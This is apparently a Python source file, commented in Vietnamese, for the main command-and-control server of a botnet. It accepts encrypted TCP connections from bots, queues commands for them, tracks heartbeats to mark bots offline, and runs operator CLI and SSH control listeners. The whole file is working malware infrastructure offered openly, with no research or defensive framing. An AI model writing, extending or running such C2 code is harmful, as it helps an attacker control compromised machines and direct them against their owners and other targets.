"""
CNC Server chính — lắng nghe kết nối từ bot qua TCP (AES-GCM encrypted).

Dùng asyncio để xử lý hàng trăm kết nối đồng thời.
"""

import argparse
import asyncio
import logging
import os
import signal
import sys

import yaml

from server.cli_handler import CLICommandHandler
from server.commands import CommandQueue
from server.db import Database
from server.handler import handle_bot
from shared.crypto import AESCrypto

logger = logging.getLogger(__name__)

# Global reference để signal handler có thể gọi stop()
_server_instance: "CNCServer | None" = None


class CNCServer:
    def __init__(self, config: dict):
        self.config = config
        self._db = Database(config.get("database", {}).get("path", "cnc.db"))
        self._cmd_queue = CommandQueue()
        self._crypto: AESCrypto | None = None
        self._server: asyncio.Server | None = None
        self._tasks: list[asyncio.Task] = []
        self._running = False

    async def start(self):
        self._running = True
        self._stop_event = asyncio.Event()

        # Crypto
        key_hex = self.config["crypto"]["key"]
        key = bytes.fromhex(key_hex)
        self._crypto = AESCrypto(key)

        # Database
        await self._db.connect()

        # Start server
        host = self.config.get("server", {}).get("host", "0.0.0.0")
        port = self.config.get("server", {}).get("port", 8443)

        self._server = await asyncio.start_server(
            lambda r, w: handle_bot(r, w, self._crypto, self._db, self._cmd_queue),
            host, port,
        )
        logger.info("CNC Server listening on %s:%s (plain TCP, AES-GCM)", host, port)

        # Background tasks
        self._tasks.append(asyncio.create_task(self._heartbeat_checker()))
        self._tasks.append(asyncio.create_task(self._nonce_cleanup()))

        # CLI socket
        cli_host = self.config.get("server", {}).get("cli_host", "127.0.0.1")
        cli_port = self.config.get("server", {}).get("cli_port", 8444)
        self._tasks.append(asyncio.create_task(self._cli_listener(cli_host, cli_port)))

        # SSH CLI listener
        ssh_cfg = self.config.get("ssh", {})
        if ssh_cfg.get("enabled", False):
            from server.ssh_cli import start_ssh_server

            ssh_host = ssh_cfg.get("host", "0.0.0.0")
            ssh_port = ssh_cfg.get("port", 2222)
            ssh_password = ssh_cfg.get("password", "")
            self._tasks.append(
                asyncio.create_task(
                    start_ssh_server(ssh_host, ssh_port, ssh_password, self._db, self._cmd_queue)
                )
            )

        # Signal handlers
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                asyncio.get_event_loop().add_signal_handler(sig, self._handle_signal)
            except NotImplementedError:
                signal.signal(sig, self._sync_signal_handler)

        await self._stop_event.wait()

    async def stop(self):
        logger.info("Shutting down...")
        self._running = False

        for task in self._tasks:
            task.cancel()
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()

        if self._server:
            self._server.close()
            await self._server.wait_closed()

        await self._db.close()
        self._stop_event.set()
        logger.info("CNC Server stopped")

    async def _heartbeat_checker(self):
        while self._running:
            try:
                timeout = self.config.get("heartbeat", {}).get("timeout", 90)
                offline_bots = await self._db.get_offline_bots(timeout)
                for bot in offline_bots:
                    logger.info("Bot %s marked offline (heartbeat timeout)", bot["bot_id"])
                    await self._db.mark_bot_offline(bot["bot_id"])
            except Exception:
                logger.exception("Heartbeat checker error")
            await asyncio.sleep(30)

    async def _nonce_cleanup(self):
        while self._running:
            try:
                await self._db.cleanup_old_nonces()
            except Exception:
                pass
            await asyncio.sleep(300)

    async def _cli_listener(self, host: str, port: int):
        """Lắng nghe lệnh từ CLI qua TCP."""
        try:
            server = await asyncio.start_server(
                lambda r, w: _handle_cli(r, w, self), host, port
            )
            async with server:
                await server.serve_forever()
        except Exception:
            logger.exception("CLI listener error")

    def _handle_signal(self):
        asyncio.create_task(self.stop())

    @staticmethod
    def _sync_signal_handler(signum, frame):
        logger.info("Received signal %d, shutting down", signum)
        sys.exit(0)


async def _handle_cli(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                      cnc: CNCServer):
    """Xử lý connection từ CLI tool qua TCP."""
    import json

    handler = CLICommandHandler(cnc._db, cnc._cmd_queue)

    async def send(obj):
        writer.write((json.dumps(obj) + "\n").encode())
        await writer.drain()

    async def recv():
        line = await reader.readline()
        if not line:
            return None
        return json.loads(line.decode().strip())

    while cnc._running:
        try:
            req = await recv()
        except Exception:
            break
        if req is None:
            break

        resp = await handler.handle_action(req.get("action", ""), req)
        await send(resp)

    writer.close()
    await writer.wait_closed()


def main():
    parser = argparse.ArgumentParser(description="CNC Server")
    parser.add_argument("--config", "-c", default="config.yaml", help="Path to config file")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    if not os.path.exists(args.config):
        logger.error("Config file not found: %s", args.config)
        sys.exit(1)

    with open(args.config) as f:
        config = yaml.safe_load(f)

    global _server_instance
    _server_instance = CNCServer(config)

    try:
        asyncio.run(_server_instance.start())
    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt received")


if __name__ == "__main__":
    main()
